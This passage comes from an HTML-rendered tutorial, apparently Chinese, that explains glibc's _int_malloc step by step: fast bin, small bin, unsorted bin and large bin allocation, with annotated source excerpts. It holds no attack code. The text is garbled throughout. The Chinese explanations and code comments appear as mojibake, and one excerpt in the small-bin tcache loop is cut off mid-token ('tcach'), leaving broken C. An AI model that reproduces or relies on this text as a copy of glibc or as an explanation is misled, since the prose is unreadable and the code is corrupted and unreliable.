class="literal">NULL</span>))&#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb,av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p,bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ2ï¼‰å…¶æ¬¡ï¼Œæ£€æŸ¥ fast bin ä¸­æ˜¯å¦æœ‰åˆé€‚çš„ chunk ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¦‚æœ nb åœ¨ fast bin èŒƒå›´å†…ï¼Œå°±é€šè¿‡ fast bin åˆ†é…ï¼Œè¿™æ®µä»£ç å¯ä»¥åœ¨åˆå§‹åŒ–ä¹‹å‰è¿è¡Œ</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast())) &#123;</span><br><span class="line">    <span class="comment">//æ ¹æ® nb æ‰¾åˆé€‚çš„ fast bin ï¼Œfb æ˜¯æŒ‡å‘å¯¹åº” fast bin çš„æŒ‡é’ˆ</span></span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av,idx);</span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span> &#123;<span class="comment">//å¦‚æœ fast bin ä¸­æœ‰ chunk ï¼Œå°±å°†å…¶æŒ‰ LIFO çš„è§„åˆ™å–å‡ºï¼Œå¦‚æœæ²¡æœ‰åˆ™è·³è¿‡</span></span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb,victim-&gt;fd,victim))</span><br><span class="line">          != victim);</span><br><span class="line">    <span class="comment">//å¦‚æœ victim != NULL ï¼Œåˆ™è¯´æ˜æ‰¾åˆ°äº†åˆé€‚çš„ chunk æ²¡æ£€æŸ¥åå°†å…¶è¿”ç»™ç”¨æˆ·</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//æ£€æŸ¥æ­¤ chunk å¤§å°æ˜¯å¦åº”åœ¨ fast bin ä¸­ï¼Œé˜²æ­¢ä¼ªé€ </span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx,<span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc():memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">            malloc_printerr (check_action,errstr,chunk2mem (victim),av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        check_remalloced_chunk (av,victim,nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p,bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ3ï¼‰ç„¶åï¼Œæ£€æŸ¥ small bin ä¸­æ˜¯å¦æœ‰åˆé€‚çš„ chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">//ç±»ä¼¼unlinkæ£€æŸ¥</span></span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">          <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">             stash them in the tcache.  */</span></span><br><span class="line">          <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">          <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">            &#123;</span><br><span class="line">              mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">              <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                      bck = tc_victim-&gt;bk;</span><br><span class="line">                      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                      bin-&gt;bk = bck;</span><br><span class="line">                      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">                      tcach                   &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ4ï¼‰æ­¤åï¼Œæ•´ç† fast bin ï¼Œè®¡ç®— large bin çš„ indexã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ°è¿™é‡Œè¿˜ä¸èƒ½æ»¡è¶³ï¼Œå°±è°ƒç”¨ malloc_consolidate() æ•´ç† fastbins ï¼Œæˆ–è®¸å°±ä¼šæœ‰åˆé€‚çš„ chunk </span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ5ï¼‰æ¥ä¸‹æ¥ï¼Œå‡½æ•°è¿›å…¥ä¸€ä¸ªå¤§çš„å¤–å±‚å¾ªç¯ for å¾ªç¯ï¼ŒåŒ…å«äº† _int_malloc () å‡½æ•°ä¹‹åçš„æ‰€æœ‰è¿›ç¨‹ã€‚ç´§æ¥ç€æ˜¯å†…å±‚ç¬¬ä¸€ä¸ª while å¾ªç¯ï¼Œå®ƒä¼šéå† unsorted bin ä¸­çš„æ¯ä¸€ä¸ª chunk ï¼Œå¦‚æœå¤§å°æ­£å¥½åˆé€‚ï¼Œå°±å°†å…¶å–å‡ºï¼Œå¦åˆ™å°±å°†å…¶æ”¾å…¥ small bin æˆ–è€… large binã€‚è¿™æ˜¯å”¯ä¸€çš„å°† chunk æ”¾è¿› small bin æˆ–è€… large bin çš„è¿‡ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; ) &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunk (av)) &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ ,<span class="number">0</span>)</span><br><span class="line">           || __builtin_expect (victim-&gt;size &gt;&gt; av-&gt;system_mem,<span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action,<span class="string">&quot;malloc():memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim),av);</span><br><span class="line">        size = chunksize (victim);</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ6ï¼‰åœ¨å†…å±‚ç¬¬ä¸€ä¸ªå¾ªç¯å†…éƒ¨ï¼Œå½“è¯·æ±‚çš„ chunk å±äº small bin ã€ unsorted bin åªæœ‰ä¸€ä¸ª chunk ä¸º last remainder å¹¶ä¸”æ»¡è¶³æ‹†åˆ†æ¡ä»¶æ—¶ï¼Œå°±å°†å…¶æ‹†åˆ†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                            set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ7ï¼‰æ¥ç€ï¼Œå°† chunk ä» unsorted bin ä¸­ç§»é™¤ï¼Œå¦‚æœå¤§å°æ­£åˆé€‚ï¼Œå°±å°†å…¶è¿”å›ç»™ç”¨æˆ·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">              <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">                 We may return one of these chunks later.  */</span></span><br><span class="line">              <span class="keyword">if</span> (tcache_nb</span><br><span class="line">                  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">                &#123;</span><br><span class="line">                  tcache_put (victim, tc_idx);</span><br><span class="line">                  return_cached = <span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ8ï¼‰å¦‚æœ chunk å¤§å°ä¸åˆé€‚ï¼Œå°±å°†å…¶æ’å…¥å¯¹åº”çš„ bin ä¸­ã€‚æ’å…¥è¿‡ç¨‹ä¹Ÿå°±æ˜¯åŒé“¾è¡¨æ’å…¥ç»“ç‚¹çš„è¿‡ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size)) <span class="comment">//åœ¨small binèŒƒå›´å†…</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              <span class="comment">//bckæŒ‡å‘å¤´èŠ‚ç‚¹ï¼Œfwdæ˜¯å¤´èŠ‚ç‚¹çš„fdèŠ‚ç‚¹ï¼Œchunkä¼šè¢«æ’å…¥åˆ°å¤´èŠ‚ç‚¹å’ŒfwdèŠ‚ç‚¹ä¹‹é—´</span></span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="comment">//åœ¨large binèŒƒå›´å†…</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"><span class="comment">//éœ€è¦å¯¹åŒå‘é“¾è¡¨è¿›è¡Œçš„é¢å¤–æ“ä½œï¼Œchunkå¤§å°æŒ‰fd_nextsizeçš„æ–¹å‘é€’å‡</span></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck) <span class="comment">//large biné“¾è¡¨ä¸ä¸ºç©º</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE; </span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="comment">//bck-&gt;bk æ˜¯æœ€å°çš„chunkï¼Œå¦‚æœå°äºå®ƒï¼Œå°±å°†chunkåŠ å…¥bckâ€”&gt;bk</span></span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">                      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span> <span class="comment">// ä¸å°äºæœ€å°çš„chunk å°±é€šè¿‡fd_nextsizeæ‰¾åˆ°ä¸å¿…ä»–å¤§çš„chunk</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"><span class="comment">//å¦‚æœå¤§å°ç›¸ç­‰ï¼Œæ’å…¥åˆ°chunkçš„fdå¤„ï¼Œæ— éœ€æ”¹åŠ¨nextsizeæ„æˆçš„åŒå‘é“¾è¡¨</span></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">                          == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span> <span class="comment">// å¦åˆ™éœ€è¦æ’å…¥nextsizeçš„åŒå‘é“¾è¡¨</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span> <span class="comment">//å¦‚æœlarge bin é“¾è¡¨ä¸ºç©ºï¼Œå°†nextsize æŒ‡å‘è‡ªå·±å³å¯</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">         filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">          &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">          &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ9ï¼‰å¦‚æœç”¨æˆ·ç”³è¯·çš„ chunk æ˜¯ large chunk ï¼Œå°±åœ¨ç¬¬ä¸€ä¸ªå¾ªç¯ç»“æŸåæœç´¢ large bin ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">    sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!in_smallbin_range (nb)) <span class="comment">//ç”³è¯·çš„chunk åœ¨large binèŒƒå›´å†…</span></span><br><span class="line">   &#123;</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">     <span class="comment">//å¦‚æœvictimç­‰äºå¤´èŠ‚ç‚¹ï¼Œè¯´æ˜binä¸ºç©ºï¼Œå¦‚æœå°äºnbè¯´æ˜ä¸ä¼šæœ‰åˆé€‚çš„</span></span><br><span class="line">     <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">         &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (victim)</span><br><span class="line">           &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="comment">//åå‘éå†chunkï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªä¸å°äºnbçš„chunk</span></span><br><span class="line">         victim = victim-&gt;bk_nextsize;</span><br><span class="line">         <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                 (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">           victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">            list does not have to be rerouted.  */</span></span><br><span class="line">         <span class="comment">//å¦‚æœè¯¥chunkå’Œä»–çš„fd chunk ä¸€æ ·å¤§ï¼Œå°±é€‰æ‹©fd chunkï¼Œé¿å…æ”¹åŠ¨nextsize</span></span><br><span class="line">         <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">             &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">               == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">           victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">         remainder_size = size - nb;</span><br><span class="line">         unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Exhaust */</span></span><br><span class="line">         <span class="comment">//å¦‚æœè¯¥chunk å‡å» nb å°äº MINSIZE ï¼Œå°±ç›´æ¥è¿”å›ç»™ç”¨æˆ·</span></span><br><span class="line">         <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">           &#123;</span><br><span class="line">             set_inuse_bit_at_offset (victim, size);</span><br><span class="line">             <span class="keyword">if</span> (av != 